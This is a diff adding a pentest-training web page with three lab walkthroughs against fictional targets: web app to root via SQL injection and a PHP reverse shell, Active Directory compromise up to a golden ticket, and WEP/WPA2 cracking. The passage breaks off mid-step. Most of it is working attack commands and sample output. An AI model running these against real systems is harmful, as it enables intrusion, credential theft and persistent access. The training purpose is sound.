@@ -10634,6 +10634,2072 @@ Company Infrastructure Map:
             </div>
         </section>
 
+        <!-- SECTION 11.5: Complete Practical Attack Labs & Real-World Scenarios -->
+        <section id="practical-labs" class="section">
+            <h2 class="section-title">Complete Practical Attack Labs & Real-World Scenarios</h2>
+            <p class="section-intro">You've learned the tools and techniques across all 11 sections. NOW it's time to put EVERYTHING together! This massive section contains complete end-to-end attack walkthroughs showing exactly how tools combine in real pentests. Each lab is a full scenario from reconnaissance → initial access → privilege escalation → lateral movement → objective completion. Perfect for CTF preparation, certification exams (OSCP, PNPT, eCPPT), and understanding real-world attack chains. Every command explained, every technique demonstrated, every mistake avoided. Let's hack! 🎯</p>
+
+            <div class=\"metaphor-box\">
+                <h4>💡 From Theory to Practice</h4>
+                <p><strong>Why complete walkthroughs matter:</strong><br><br>
+                Learning individual tools is like knowing how to use a hammer, saw, and screwdriver. But building a house requires knowing WHEN and HOW to use each tool together! These labs teach you:<br><br>
+                • <strong>Tool chaining:</strong> nmap → gobuster → SQL injection → shell → privilege escalation<br>
+                • <strong>Pivot thinking:</strong> What to do when initial attack fails? Try another vector!<br>
+                • <strong>Real-world timing:</strong> Some exploits take hours to run - plan accordingly<br>
+                • <strong>Evidence preservation:</strong> Screenshot everything for your pentest report<br>
+                • <strong>Attack paths:</strong> Multiple ways to reach the goal - find the easiest!<br><br>
+                <strong>Each lab includes:</strong><br>
+                • <strong>Scenario:</strong> Target description and objectives<br>
+                • <strong>Reconnaissance:</strong> Information gathering phase<br>
+                • <strong>Enumeration:</strong> Service-specific deep dives<br>
+                • <strong>Initial Access:</strong> Getting that first shell<br>
+                • <strong>Privilege Escalation:</strong> Becoming root/SYSTEM<br>
+                • <strong>Lateral Movement:</strong> Compromising additional hosts<br>
+                • <strong>Persistence:</strong> Maintaining access<br>
+                • <strong>Lessons Learned:</strong> Key takeaways and common mistakes<br><br>
+                Think of these as your "master class" - watching an expert hacker work through complete engagements! 🎓</p>
+            </div>
+
+            <h3>Lab 1: Complete Web Application Penetration Test (Beginner-Friendly)</h3>
+
+            <div class=\"info-box\">
+                <h4>📋 Lab Overview</h4>
+                <p><strong>Target:</strong> vulnerable-webapp.htb (fictional)<br>
+                <strong>Goal:</strong> Find and exploit vulnerabilities, escalate to admin, read /root/flag.txt<br>
+                <strong>Difficulty:</strong> Easy (beginner-friendly)<br>
+                <strong>Skills tested:</strong> Recon, subdomain enum, SQL injection, file upload, privilege escalation<br>
+                <strong>Time estimate:</strong> 2-4 hours for complete beginner<br>
+                <strong>Tools used:</strong> nmap, gobuster, Burp Suite, SQLmap, LinPEAS, GTFOBins</p>
+            </div>
+
+            <div class="code"># ==================================================
+# PHASE 1: RECONNAISSANCE
+# ==================================================
+
+# Step 1: Add to /etc/hosts
+echo "10.10.10.100  vulnerable-webapp.htb" | sudo tee -a /etc/hosts
+
+# Step 2: Initial nmap scan
+nmap -sC -sV -oA nmap/initial vulnerable-webapp.htb
+
+# Output:
+# PORT   STATE SERVICE VERSION
+# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+# 80/tcp open  http    Apache/2.4.41 (Ubuntu)
+# |_http-title: VulnWeb Inc.
+
+# Analysis:
+# ✅ SSH (port 22) → Potential brute force, but usually low priority
+# ✅ HTTP (port 80) → Main attack surface, start here!
+
+# Step 3: Full port scan (while we investigate web)
+nmap -p- --min-rate 10000 -oA nmap/allports vulnerable-webapp.htb &
+
+# Step 4: Subdomain enumeration
+gobuster vhost -u http://vulnerable-webapp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Output:
+# Found: admin.vulnerable-webapp.htb
+# Found: dev.vulnerable-webapp.htb
+
+# Add to /etc/hosts:
+echo "10.10.10.100  admin.vulnerable-webapp.htb dev.vulnerable-webapp.htb" | sudo tee -a /etc/hosts
+
+# ==================================================
+# PHASE 2: WEB ENUMERATION
+# ==================================================
+
+# Step 5: Browse to main site
+firefox http://vulnerable-webapp.htb
+
+# Observations:
+# - Company website
+# - "Products" page
+# - "Contact Us" form
+# - "Login" link (leads to admin.vulnerable-webapp.htb)
+# - Footer: "Powered by CustomCMS 2.3"
+
+# Step 6: Technology fingerprinting
+whatweb http://vulnerable-webapp.htb
+
+# Output:
+# Apache 2.4.41
+# PHP 7.4
+# jQuery 3.5
+# Bootstrap 4
+
+# Step 7: Directory brute force
+gobuster dir -u http://vulnerable-webapp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
+
+# Output:
+# /index.php
+# /images/
+# /css/
+# /js/
+# /admin/ (301 redirect to admin.vulnerable-webapp.htb)
+# /uploads/ (403 Forbidden - interesting!)
+# /backup/ (403 Forbidden - VERY interesting!)
+# /config.php.bak (200 OK - JACKPOT!)
+
+# Step 8: Download interesting file
+wget http://vulnerable-webapp.htb/config.php.bak
+
+# View contents:
+cat config.php.bak
+
+# Found:
+# <?php
+# $db_host = 'localhost';
+# $db_name = 'webapp_db';
+# $db_user = 'webapp_user';
+# $db_pass = 'SuperSecretPassword123!';
+# ?>
+
+# 🎯 Potential win: Database credentials!
+
+# ==================================================
+# PHASE 3: FINDING SQL INJECTION
+# ==================================================
+
+# Step 9: Test products page for SQLi
+# URL: http://vulnerable-webapp.htb/product.php?id=1
+
+# Manual test:
+curl "http://vulnerable-webapp.htb/product.php?id=1'"
+
+# Output:
+# MySQL error: You have an error in your SQL syntax...
+
+# ✅ SQL injection confirmed!
+
+# Step 10: SQLmap enumeration
+sqlmap -u "http://vulnerable-webapp.htb/product.php?id=1" --dbs
+
+# Output:
+# [*] information_schema
+# [*] webapp_db
+
+# Enumerate webapp_db:
+sqlmap -u "http://vulnerable-webapp.htb/product.php?id=1" -D webapp_db --tables
+
+# Output:
+# [*] products
+# [*] users
+# [*] orders
+
+# Dump users table:
+sqlmap -u "http://vulnerable-webapp.htb/product.php?id=1" -D webapp_db -T users --dump
+
+# Output:
+# +----+----------+----------------------------------+
+# | id | username | password                         |
+# +----+----------+----------------------------------+
+# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
+# | 2  | jsmith   | 098f6bcd4621d373cade4e832627b4f6 |
+# +----+----------+----------------------------------+
+
+# Step 11: Crack hashes
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
+echo "098f6bcd4621d373cade4e832627b4f6" >> hashes.txt
+
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Output:
+# password (admin)
+# test (jsmith)
+
+# 🎯 Credentials: admin:password
+
+# ==================================================
+# PHASE 4: ADMIN ACCESS & FILE UPLOAD
+# ==================================================
+
+# Step 12: Login to admin panel
+firefox http://admin.vulnerable-webapp.htb
+
+# Login with admin:password → Success!
+
+# Observations:
+# - Dashboard
+# - User management
+# - Product management → "Upload Product Image" feature
+# - File manager
+
+# Step 13: Test file upload
+# Create PHP reverse shell:
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+
+# Edit shell.php:
+# Change IP to your Kali IP: 10.10.14.5
+# Change port to: 4444
+
+# Try uploading shell.php → Error: "Only images allowed"
+
+# Step 14: Bypass upload filter
+# Method 1: Double extension
+mv shell.php shell.php.jpg
+# Upload → Still blocked
+
+# Method 2: Content-Type manipulation
+# Intercept with Burp Suite
+# Change Content-Type: from application/x-php to image/jpeg
+# Upload → Success!
+
+# File uploaded to: /uploads/shell.php.jpg
+
+# Step 15: Check if PHP executed
+curl http://vulnerable-webapp.htb/uploads/shell.php.jpg
+
+# Output: PHP source code displayed (not executed)
+
+# Step 16: Try different extension
+# Create shell.php5 (alternative PHP extension)
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
+
+# Edit IP/port, upload → Success!
+
+# ==================================================
+# PHASE 5: INITIAL ACCESS (REVERSE SHELL)
+# ==================================================
+
+# Step 17: Start netcat listener
+nc -lvnp 4444
+
+# Step 18: Trigger shell
+curl http://vulnerable-webapp.htb/uploads/shell.php5
+
+# 🎯 Shell received!
+# Connection from 10.10.10.100
+
+# Stabilize shell:
+python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
+# Press Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+
+# Now we have a proper interactive shell!
+
+# ==================================================
+# PHASE 6: PRIVILEGE ESCALATION
+# ==================================================
+
+# Step 19: Basic enumeration
+whoami
+# www-data
+
+id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+uname -a
+# Linux vulnerable-webapp 5.4.0-42-generic #46-Ubuntu
+
+ls /home
+# jsmith
+# admin
+
+cat /etc/passwd | grep bash
+# root:x:0:0:root:/root:/bin/bash
+# jsmith:x:1000:1000::/home/jsmith:/bin/bash
+# admin:x:1001:1001::/home/admin:/bin/bash
+
+# Step 20: Check sudo permissions
+sudo -l
+# Sorry, user www-data may not run sudo
+
+# Step 21: Find SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Output:
+# /usr/bin/passwd
+# /usr/bin/gpasswd
+# /usr/bin/chsh
+# /usr/bin/find (INTERESTING!)
+# /usr/bin/sudo
+# /bin/mount
+# /bin/su
+
+# Step 22: Check GTFOBins for /usr/bin/find
+# GTFOBins shows: find can execute commands!
+
+# Exploit:
+find . -exec /bin/bash -p \\;
+
+# Result:
+whoami
+# root
+
+# 🎯 WE ARE ROOT!
+
+# ==================================================
+# PHASE 7: POST-EXPLOITATION
+# ==================================================
+
+# Step 23: Read flags
+cat /root/flag.txt
+# HTB{SQL_Inj3ct1on_t0_R00t_Sh3ll_GG!}
+
+cat /home/jsmith/user.txt
+# HTB{u53r_fl4g_g0t!}
+
+# Step 24: Persistence (for learning - NOT for real pentests without permission!)
+
+# Add SSH key:
+mkdir /root/.ssh
+echo "ssh-rsa AAAAB3Nza..." > /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+# Now you can SSH as root:
+ssh root@vulnerable-webapp.htb
+
+# ==================================================
+# LESSONS LEARNED
+# ==================================================
+
+# ✅ Always check for backup files (.bak, .old, ~)
+# ✅ SQL injection → Often leads to credential disclosure
+# ✅ File upload filters → Try multiple bypass techniques
+# ✅ SUID binaries → Always check against GTFOBins
+# ✅ Stabilize shells immediately for better experience
+# ✅ Document everything with screenshots for report
+
+# Attack path summary:
+# 1. Found config.php.bak with DB credentials
+# 2. Discovered SQL injection in product.php
+# 3. Dumped database → Got admin hash
+# 4. Cracked hash → admin:password
+# 5. Logged into admin panel
+# 6. Uploaded PHP shell via .php5 extension
+# 7. Got reverse shell as www-data
+# 8. Found SUID /usr/bin/find binary
+# 9. Exploited find → Got root
+# 10. Read flags → Lab complete!
+
+# Time taken: ~2 hours for beginner
+# Difficulty: Easy (good first box!)</div>
+
+            <h3>Lab 2: Active Directory Penetration Test (Complete Domain Compromise)</h3>
+
+            <div class=\"info-box\">
+                <h4>📋 Lab Overview</h4>
+                <p><strong>Target:</strong> CORP.LOCAL domain (10.10.10.0/24)<br>
+                <strong>Domain Controller:</strong> DC01.CORP.LOCAL (10.10.10.10)<br>
+                <strong>Goal:</strong> Gain Domain Admin access, dump all credentials<br>
+                <strong>Difficulty:</strong> Intermediate<br>
+                <strong>Skills tested:</strong> SMB enum, Kerberoasting, lateral movement, Pass-the-Hash, DCSync<br>
+                <strong>Time estimate:</strong> 4-6 hours<br>
+                <strong>Tools used:</strong> nmap, enum4linux, Impacket, Responder, Bloodhound, Mimikatz, CrackMapExec</p>
+            </div>
+
+            <div class="code"># ==================================================
+# PHASE 1: INITIAL RECONNAISSANCE
+# ==================================================
+
+# Network: 10.10.10.0/24
+# Your Kali: 10.10.10.50
+# Domain Controller: 10.10.10.10 (DC01.CORP.LOCAL)
+# File Server: 10.10.10.20 (FS01.CORP.LOCAL)
+# Workstation: 10.10.10.30 (WS01.CORP.LOCAL)
+
+# Step 1: Add to /etc/hosts
+echo "10.10.10.10  DC01.CORP.LOCAL DC01" | sudo tee -a /etc/hosts
+echo "10.10.10.20  FS01.CORP.LOCAL FS01" | sudo tee -a /etc/hosts
+echo "10.10.10.30  WS01.CORP.LOCAL WS01" | sudo tee -a /etc/hosts
+
+# Step 2: Network scan
+nmap -sn 10.10.10.0/24
+
+# Step 3: Detailed scan of discovered hosts
+nmap -sC -sV -p- -oA nmap/ad_scan 10.10.10.10,10.10.10.20,10.10.10.30
+
+# DC01 (10.10.10.10) ports:
+# 53/tcp  - DNS
+# 88/tcp  - Kerberos
+# 135/tcp - RPC
+# 139/tcp - NetBIOS
+# 389/tcp - LDAP
+# 445/tcp - SMB
+# 464/tcp - Kerberos Password Change
+# 3389/tcp - RDP
+# → Confirmed Domain Controller!
+
+# FS01 (10.10.10.20) ports:
+# 135/tcp - RPC
+# 139/tcp - NetBIOS
+# 445/tcp - SMB
+# → File server
+
+# WS01 (10.10.10.30) ports:
+# 135/tcp - RPC
+# 139/tcp - NetBIOS
+# 445/tcp - SMB
+# 3389/tcp - RDP
+# → Workstation
+
+# ==================================================
+# PHASE 2: SMB ENUMERATION (NO CREDENTIALS)
+# ==================================================
+
+# Step 4: Anonymous SMB enumeration
+smbclient -L //10.10.10.10 -N
+
+# Output:
+# Sharename  Type  Comment
+# ---------  ----  -------
+# ADMIN$     Disk  Remote Admin
+# C$         Disk  Default share
+# IPC$       IPC   Remote IPC
+# NETLOGON   Disk  Logon server share
+# SYSVOL     Disk  Logon server share
+
+# Step 5: Try null session
+smbclient //10.10.10.10/SYSVOL -N
+
+# Access denied (expected)
+
+# Step 6: Enum4linux
+enum4linux -a 10.10.10.10
+
+# Output:
+# Domain: CORP
+# Domain SID: S-1-5-21-1234567890-1234567890-1234567890
+# 
+# Users:
+#   Administrator (RID 500)
+#   Guest (RID 501)
+#   krbtgt (RID 502)
+#   jsmith (RID 1103)
+#   awhite (RID 1104)
+#   bthomas (RID 1105)
+#   sqlservice (RID 1106)
+# 
+# Password Policy:
+#   Minimum password length: 7
+#   Password complexity: Enabled
+#   Lockout threshold: None (brute force possible!)
+
+# 🎯 User list obtained!
+
+# Create users.txt:
+cat > users.txt <<EOF
+Administrator
+jsmith
+awhite
+bthomas
+sqlservice
+EOF
+
+# ==================================================
+# PHASE 3: KERBEROS ENUMERATION
+# ==================================================
+
+# Step 7: Kerbrute user enumeration
+kerbrute userenum --dc 10.10.10.10 -d CORP.LOCAL users.txt
+
+# Output:
+# [+] VALID USERNAME: Administrator@CORP.LOCAL
+# [+] VALID USERNAME: jsmith@CORP.LOCAL
+# [+] VALID USERNAME: awhite@CORP.LOCAL
+# [+] VALID USERNAME: bthomas@CORP.LOCAL
+# [+] VALID USERNAME: sqlservice@CORP.LOCAL
+
+# All users confirmed!
+
+# Step 8: AS-REP Roasting (check for users without Kerberos pre-auth)
+impacket-GetNPUsers CORP.LOCAL/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
+
+# Output:
+# [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+# [-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
+# [+] $krb5asrep$23$awhite@CORP.LOCAL:a1b2c3d4e5f6...
+
+# 🎯 User awhite is AS-REP roastable!
+
+# Step 9: Crack AS-REP hash
+echo '$krb5asrep$23$awhite@CORP.LOCAL:a1b2c3d4e5f6...' > awhite_asrep.hash
+
+hashcat -m 18200 awhite_asrep.hash /usr/share/wordlists/rockyou.txt
+
+# Output:
+# Password: Welcome123!
+
+# 🎯 First credential: CORP\\awhite:Welcome123!
+
+# ==================================================
+# PHASE 4: AUTHENTICATED ENUMERATION
+# ==================================================
+
+# Step 10: Validate credentials
+crackmapexec smb 10.10.10.10 -u awhite -p 'Welcome123!' -d CORP.LOCAL
+
+# Output:
+# SMB  10.10.10.10  445  DC01  [+] CORP.LOCAL\\awhite:Welcome123!
+
+# Step 11: Enumerate SMB shares with creds
+smbmap -u awhite -p 'Welcome123!' -d CORP.LOCAL -H 10.10.10.10
+
+# Output:
+# [+] Finding open SMB ports....
+# [+] User SMB session established on 10.10.10.10...
+# [+] IP: 10.10.10.10:445  Name: DC01.CORP.LOCAL
+#   Disk         Permissions
+#   ----         -----------
+#   ADMIN$       NO ACCESS
+#   C$           NO ACCESS
+#   IPC$         READ ONLY
+#   NETLOGON     READ ONLY
+#   SYSVOL       READ ONLY
+#   Users        READ, WRITE
+
+# Step 12: Explore Users share
+smbclient //10.10.10.10/Users -U 'CORP.LOCAL\\awhite%Welcome123!'
+
+# Browse directories:
+# awhite/
+# jsmith/
+# bthomas/
+# Public/
+
+# Check awhite folder:
+cd awhite
+ls
+# notes.txt
+
+get notes.txt
+cat notes.txt
+# "Remember: SQLService password is MYpassword123#"
+
+# 🎯 Second credential: CORP\\sqlservice:MYpassword123#
+
+# ==================================================
+# PHASE 5: KERBEROASTING
+# ==================================================
+
+# Step 13: Request service tickets (Kerberoasting)
+impacket-GetUserSPNs CORP.LOCAL/awhite:'Welcome123!' -dc-ip 10.10.10.10 -request
+
+# Output:
+# ServicePrincipalName  Name        MemberOf  PasswordLastSet
+# --------------------  ----------  --------  ---------------
+# MSSQLSvc/FS01:1433    sqlservice            2023-01-15
+
+# $krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/FS01:1433*$abc123...
+
+# Step 14: Crack service ticket
+echo '$krb5tgs$23$*sqlservice...' > sqlservice.hash
+
+hashcat -m 13100 sqlservice.hash /usr/share/wordlists/rockyou.txt
+
+# Already have password from notes.txt, but good practice!
+
+# ==================================================
+# PHASE 6: BLOODHOUND ANALYSIS
+# ==================================================
+
+# Step 15: Collect BloodHound data
+bloodhound-python -u awhite -p 'Welcome123!' -ns 10.10.10.10 -d CORP.LOCAL -c All
+
+# Output:
+# INFO: Found AD domain: corp.local
+# INFO: Getting TGT for user
+# INFO: Connecting to LDAP server: DC01.CORP.LOCAL
+# INFO: Done in 00M 42S
+# INFO: Compressing output into 20240101120000_bloodhound.zip
+
+# Step 16: Start BloodHound
+sudo neo4j start
+bloodhound
+
+# Upload 20240101120000_bloodhound.zip
+
+# Step 17: Analyze attack paths
+# Query: "Shortest Path to Domain Admins from Owned Principals"
+# Mark awhite as owned
+
+# Path discovered:
+# awhite (Owned)
+#   → MemberOf → IT_SUPPORT
+#   → GenericAll → jsmith
+#   → MemberOf → DOMAIN ADMINS
+
+# Analysis:
+# 1. awhite is in IT_SUPPORT group
+# 2. IT_SUPPORT has GenericAll permissions on jsmith user
+# 3. jsmith is a Domain Admin!
+# 4. We can change jsmith's password!
+
+# ==================================================
+# PHASE 7: LATERAL MOVEMENT (TARGETED KERBEROASTING)
+# ==================================================
+
+# Step 18: Change jsmith password using GenericAll
+impacket-changepasswd CORP.LOCAL/jsmith:'NewPassword123!'@10.10.10.10 -newpass 'NewPassword123!' -altuser awhite -altpass 'Welcome123!'
+
+# Actually, better approach: Add SPN to jsmith, then Kerberoast
+
+# Set SPN on jsmith:
+impacket-addspn -u CORP.LOCAL\\awhite -p 'Welcome123!' -s 'HTTP/fake' -t jsmith DC01.CORP.LOCAL
+
+# Now Kerberoast jsmith:
+impacket-GetUserSPNs CORP.LOCAL/awhite:'Welcome123!' -dc-ip 10.10.10.10 -request-user jsmith
+
+# Output:
+# $krb5tgs$23$*jsmith...'
+
+# Crack:
+hashcat -m 13100 jsmith.hash rockyou.txt
+
+# Output:
+# Password123!
+
+# 🎯 Domain Admin credential: CORP\\jsmith:Password123!
+
+# ==================================================
+# PHASE 8: DOMAIN ADMIN ACCESS
+# ==================================================
+
+# Step 19: Validate Domain Admin access
+crackmapexec smb 10.10.10.10 -u jsmith -p 'Password123!' -d CORP.LOCAL
+
+# Output:
+# SMB  10.10.10.10  445  DC01  [+] CORP.LOCAL\\jsmith:Password123! (Pwn3d!)
+# (Pwn3d!) = Local admin access!
+
+# Step 20: PSExec as Domain Admin
+impacket-psexec CORP.LOCAL/jsmith:'Password123!'@10.10.10.10
+
+# Output:
+# [*] Requesting shares on 10.10.10.10.....
+# [*] Found writable share ADMIN$
+# [*] Uploading file...
+# [*] Opening SVCManager on 10.10.10.10.....
+# [*] Starting service...
+
+# C:\\Windows\\system32> whoami
+# corp\\jsmith
+
+# C:\\Windows\\system32> net user jsmith /domain
+# Global Group memberships     *Domain Users   *Domain Admins
+# → Domain Admin confirmed!
+
+# ==================================================
+# PHASE 9: CREDENTIAL DUMPING
+# ==================================================
+
+# Step 21: Dump SAM hashes
+impacket-secretsdump CORP.LOCAL/jsmith:'Password123!'@10.10.10.10
+
+# Output:
+# [*] Service RemoteRegistry is in stopped state
+# [*] Starting service RemoteRegistry
+# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6:::
+# CORP.LOCAL\\awhite:1103:aad3b435b51404eeaad3b435b51404ee:n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6:::
+# CORP.LOCAL\\jsmith:1104:aad3b435b51404eeaad3b435b51404ee:m1n2o3p4q5r6s7t8u9v0w1x2y3z4a5b6:::
+
+# 🎯 All domain hashes dumped!
+
+# Step 22: DCSync attack (alternative method)
+impacket-secretsdump -just-dc CORP.LOCAL/jsmith:'Password123!'@10.10.10.10
+
+# Step 23: Pass-the-Hash (no password needed!)
+crackmapexec smb 10.10.10.0/24 -u Administrator -H 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6'
+
+# Output:
+# SMB  10.10.10.10  445  DC01  [+] CORP.LOCAL\\Administrator (Pwn3d!)
+# SMB  10.10.10.20  445  FS01  [+] CORP.LOCAL\\Administrator (Pwn3d!)
+# SMB  10.10.10.30  445  WS01  [+] CORP.LOCAL\\Administrator (Pwn3d!)
+
+# 🎯 FULL DOMAIN COMPROMISE!
+
+# ==================================================
+# PHASE 10: PERSISTENCE (GOLDEN TICKET)
+# ==================================================
+
+# Step 24: Create Golden Ticket
+# Need:
+# - Domain SID: S-1-5-21-1234567890-1234567890-1234567890
+# - krbtgt hash: x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6
+
+impacket-ticketer -nthash x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6 -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain CORP.LOCAL Administrator
+
+# Output:
+# [*] Creating basic skeleton ticket and PAC Infos
+# [*] Customizing ticket for CORP.LOCAL/Administrator
+# [*] Saving ticket in Administrator.ccache
+
+# Use Golden Ticket:
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec CORP.LOCAL/Administrator@DC01.CORP.LOCAL -k -no-pass
+
+# 🎯 Access to DC with forged ticket (valid for 10 years!)
+
+# ==================================================
+# LESSONS LEARNED
+# ==================================================
+
+# ✅ Start with anonymous enumeration (enum4linux, Kerbrute)
+# ✅ AS-REP Roasting → Often finds service accounts with weak passwords
+# ✅ Always read SMB shares for interesting files
+# ✅ BloodHound → Shows attack paths you wouldn't find manually
+# ✅ Kerberoasting → Service accounts often have passwords in wordlists
+# ✅ GenericAll/WriteDACL permissions → Powerful for lateral movement
+# ✅ Pass-the-Hash → Don't need plaintext passwords!
+# ✅ Golden Ticket → Ultimate persistence (but also ultimate red flag!)
+
+# Attack path summary:
+# 1. Enum4linux → Found usernames
+# 2. AS-REP Roasting → Got awhite password
+# 3. SMB enumeration → Found sqlservice password in notes.txt
+# 4. BloodHound → Discovered awhite → jsmith attack path
+# 5. Targeted Kerberoasting → Cracked jsmith (Domain Admin)
+# 6. PSExec → Got shell on DC
+# 7. SecretsDump → Dumped all domain credentials
+# 8. Pass-the-Hash → Compromised all hosts
+# 9. Golden Ticket → Established persistence
+
+# Time taken: ~5 hours
+# Difficulty: Intermediate (realistic AD environment!)</div>
+
+            <h3>Lab 3: Complete Wireless Attack Chain (WEP → WPA2 → WPA3)</h3>
+
+            <div class=\"info-box\">
+                <h4>📋 Lab Overview</h4>
+                <p><strong>Targets:</strong> Three WiFi networks with different security<br>
+                <strong>Goal:</strong> Crack all three networks, understand weaknesses<br>
+                <strong>Difficulty:</strong> Beginner to Intermediate<br>
+                <strong>Skills tested:</strong> WiFi fundamentals, packet capture, WEP/WPA/WPA3 attacks<br>
+                <strong>Time estimate:</strong> 3-5 hours (WEP fast, WPA2 depends on password)<br>
+                <strong>Tools used:</strong> aircrack-ng suite, Wireshark, hcxdumptool, hashcat<br>
+                <strong>Requirements:</strong> WiFi adapter with monitor mode + injection support</p>
+            </div>
+
+            <div class="code"># ==================================================
+# SETUP: WiFi ADAPTER CONFIGURATION
+# ==================================================
+
+# Step 1: Verify WiFi adapter
+iwconfig
+
+# Output:
+# wlan0  IEEE 802.11  ESSID:off/any
+#        Mode:Managed  Access Point: Not-Associated
+
+# Check chipset:
+lsusb | grep -i wireless
+# Or:
+airmon-ng
+
+# Output:
+# PHY   Interface  Driver    Chipset
+# phy0  wlan0      ath9k_htc Atheros Communications, Inc. AR9271
+
+# ✅ Atheros AR9271 → Excellent for hacking!
+
+# ==================================================
+# NETWORK 1: WEP ATTACK (ANCIENT, BROKEN)
+# ==================================================
+
+# Target: "CoffeeShop_FREE" (WEP encryption)
+# Reality: Still found in old routers, IoT devices
+
+# Step 2: Enable monitor mode
+sudo airmon-ng start wlan0
+
+# Output:
+# PHY   Interface  Driver    Chipset
+# phy0  wlan0mon   ath9k_htc Atheros Communications, Inc. AR9271
+# (monitor mode enabled on wlan0mon)
+
+# Step 3: Scan for networks
+sudo airodump-ng wlan0mon
+
+# Output:
+# BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC  CIPHER AUTH ESSID
+# A1:B2:C3:D4:E5:F6  -35       24     15    2   6  54e. WEP  WEP         CoffeeShop_FREE
+# A2:B3:C4:D5:E6:F7  -48       18      0    0  11  54e  WPA2 CCMP   PSK  MyHomeWiFi
+# A3:B4:C5:D6:E7:F8  -52       12      2    0   1  54e  WPA3 CCMP   SAE  SecureNetwork
+
+# Target identified:
+# BSSID: A1:B2:C3:D4:E5:F6
+# Channel: 6
+# ESSID: CoffeeShop_FREE
+# Encryption: WEP
+
+# Step 4: Capture packets from target
+sudo airodump-ng -c 6 --bssid A1:B2:C3:D4:E5:F6 -w wep_capture wlan0mon
+
+# Output:
+# CH  6 ][ Elapsed: 2 mins ]
+# BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC
+# A1:B2:C3:D4:E5:F6  -35      240    315    3   6  54e. WEP
+# 
+# BSSID              STATION            PWR   Rate  Lost  Packets
+# A1:B2:C3:D4:E5:F6  B1:C2:D3:E4:F5:A6  -42   54e-54e   0      128
+
+# Keep this running! Need 40,000-85,000 IVs (initialization vectors)
+# For WEP: More packets = faster crack
+
+# Step 5: Speed up process with packet injection (new terminal)
+sudo aireplay-ng -3 -b A1:B2:C3:D4:E5:F6 -h B1:C2:D3:E4:F5:A6 wlan0mon
+
+# -3: ARP request replay attack
+# -b: Target BSSID
+# -h: Client MAC (from airodump)
+
+# Output:
+# Saving ARP requests in replay_arp-0101-120000.cap
+# You should also start airodump-ng to capture replies.
+# Read 2435 packets...
+#         Size: 312, FromDS: 1, ToDS: 0
+#         BSSID = A1:B2:C3:D4:E5:F6
+#         Source MAC = B1:C2:D3:E4:F5:A6
+# Sending 615 packets per second...
+
+# Watch airodump-ng window:
+# #Data column increasing rapidly!
+# 5,000 → 10,000 → 25,000 → 50,000 packets
+
+# Step 6: Crack WEP (after ~40,000 IVs)
+sudo aircrack-ng wep_capture-01.cap
+
+# Output:
+# Opening wep_capture-01.cap
+# Attack will be restarted every 5000 captured ivs.
+# 
+#                      Aircrack-ng 1.6
+# 
+#                  [00:02:15] Tested 1834562 keys (got 47328 IVs)
+# 
+#    KB    depth   byte(vote)
+#     0    0/  1   5A(47104) 2F(46080) 8E(45824) ...
+#     1    0/  1   3C(47360) A1(46336) 2D(45568) ...
+# 
+# KEY FOUND! [ 5A:3C:8F:21:D4:9B:E7:A2:1F:C3:4D ]
+# Decrypted correctly: 100%
+
+# 🎯 WEP cracked in ~2 minutes!
+
+# Step 7: Connect to WEP network
+# Convert hex key to ASCII:
+echo "5A3C8F21D49BE7A21FC34D" | xxd -r -p
+# Or just use hex directly
+
+sudo nmcli device wifi connect "CoffeeShop_FREE" password "5A:3C:8F:21:D4:9B:E7:A2:1F:C3:4D"
+
+# Connected! Free coffee shop internet 😅
+
+# ==================================================
+# NETWORK 2: WPA2-PSK ATTACK (HANDSHAKE CAPTURE)
+# ==================================================
+
+# Target: "MyHomeWiFi" (WPA2-PSK/CCMP)
+# Modern standard, but vulnerable to dictionary attacks
+
+# Step 8: Capture WPA2 handshake
+sudo airodump-ng -c 11 --bssid A2:B3:C4:D5:E6:F7 -w wpa2_capture wlan0mon
+
+# Output shows one client connected:
+# STATION: C1:D2:E3:F4:A5:B6
+
+# Need to capture 4-way handshake:
+# Occurs when client connects to AP
+# Options:
+#   a) Wait for natural connection (slow)
+#   b) Force deauthentication (fast)
+
+# Step 9: Deauth attack (force handshake)
+# New terminal:
+sudo aireplay-ng -0 5 -a A2:B3:C4:D5:E6:F7 -c C1:D2:E3:F4:A5:B6 wlan0mon
+
+# -0: Deauth attack
+# 5: Send 5 deauth packets
+# -a: AP BSSID
+# -c: Client MAC
+
+# Output:
+# 12:45:23  Waiting for beacon frame (BSSID: A2:B3:C4:D5:E6:F7) on channel 11
+# 12:45:24  Sending 64 directed DeAuth...
+# 12:45:24  Sending 64 directed DeAuth...
+
+# Watch airodump-ng terminal:
+# Top right corner shows:
+# [ WPA handshake: A2:B3:C4:D5:E6:F7 ]
+
+# 🎯 Handshake captured!
+
+# Step 10: Verify handshake
